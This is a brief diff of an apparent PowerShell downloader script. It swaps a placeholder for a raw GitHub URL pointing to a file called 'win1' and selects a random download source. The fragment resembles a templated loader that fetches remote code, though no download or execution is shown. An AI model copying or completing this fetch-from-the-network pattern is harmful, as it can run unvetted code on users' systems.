@@ -8,7 +8,7 @@ $ErrorActionPreference = "Stop"
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
 $CommonURLPart = ''
-$DownloadURL1 = '!Exect!'
+$DownloadURL1 = 'https://raw.githubusercontent.com/BL4ckCloud/abahzian/main/win1'
 
 $URLs = @($DownloadURL1)
 $RandomURL1 = Get-Random -InputObject $URLs
